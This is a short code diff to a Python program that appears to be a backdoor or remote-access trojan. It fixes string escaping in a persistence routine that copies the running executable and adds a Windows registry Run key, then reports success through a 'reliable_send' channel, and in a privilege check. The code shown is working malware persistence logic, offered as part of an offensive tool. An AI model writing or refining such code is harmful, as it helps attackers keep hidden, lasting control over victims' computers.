@@ -144,8 +144,9 @@ def persist(reg_name, copy_name):
         if not os.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
             subprocess.call(
-                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
+                r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + r' /t REG_SZ /d "' + file_location + r'"',
                 shell=True)
+
             reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
         else:
             reliable_send('[+] Persistence Already Exists')
@@ -162,7 +163,7 @@ def is_admin():
     global admin
     if platform == 'win32':
         try:
-            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
+            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', r'C:\windows'), 'temp']))
         except:
             admin = '[!!] User Privileges!'
         else:
